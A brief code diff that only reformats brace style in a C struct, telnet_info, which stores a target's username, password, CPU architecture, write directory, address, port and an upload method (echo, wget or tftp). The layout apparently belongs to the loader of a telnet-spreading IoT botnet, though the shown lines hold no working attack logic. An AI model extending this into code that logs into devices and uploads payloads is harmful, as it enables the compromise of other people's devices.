@@ -2,13 +2,11 @@
 
 #include "includes.h"
 
-struct telnet_info
-{
+struct telnet_info {
     char user[32], pass[32], arch[6], writedir[32];
     ipv4_t addr;
     port_t port;
-    enum
-    {
+    enum {
         UPLOAD_ECHO,
         UPLOAD_WGET,
         UPLOAD_TFTP
